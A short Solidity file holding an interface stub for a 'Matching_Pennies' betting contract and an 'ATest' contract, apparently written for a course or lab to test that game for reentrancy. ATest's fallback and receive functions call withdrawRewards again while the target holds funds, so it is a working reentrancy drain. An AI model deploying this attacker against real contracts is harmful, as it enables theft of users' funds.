pragma solidity >=0.7.0 <0.9.0;

contract Matching_Pennies {
    // functions in your Matching_Pennies contract
    function newGame(bytes32 commitPenny) public payable returns (uint256) {}

    function playGame(uint256 gameNo, int8 pennies) public payable {}

    function withdrawRewards(uint256 gameNo) public {}

    function revealPenny(
        uint256 gameNo,
        int8 penny,
        string memory secret
    ) public returns (address) {}
}

contract ATest {
    Matching_Pennies private _mp;
    address private _owner;
    uint256 test;

    constructor() {
        _owner = msg.sender;
    }

    fallback() external payable {
        if (address(_mp).balance >= 1 ether) {
            _mp.withdrawRewards(1);
        }
        // withdraw();
    }

    receive() external payable {
        if (address(_mp).balance >= 1 ether) {
            _mp.withdrawRewards(1);
        }
        // withdraw();
    }

    function setMP(address addr) public {
        _mp = Matching_Pennies(addr);
    }

    function deposit() public payable {}

    function withdraw() public {
        require(msg.sender == _owner);
        payable(_owner).transfer(address(this).balance);
    }

    function checkBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function attackNewGame() public {
        _mp.newGame{value: 1 ether}(
            0xc5c0c6cf97373312cb3f27e3e5a1b7e481b8b3f147cbc36afdce588ff1f66893
        );
    }

    function reveal(uint256 gameNo) public {
        _mp.revealPenny(gameNo, 1, "123");
    }

    function attackExistedGame(uint256 gameNo, int8 pennies) public {
        _mp.playGame{value: 1 ether}(gameNo, pennies);
    }

    function withdrawRewards(uint256 gameNo) public {
        _mp.withdrawRewards(gameNo);
    }
}
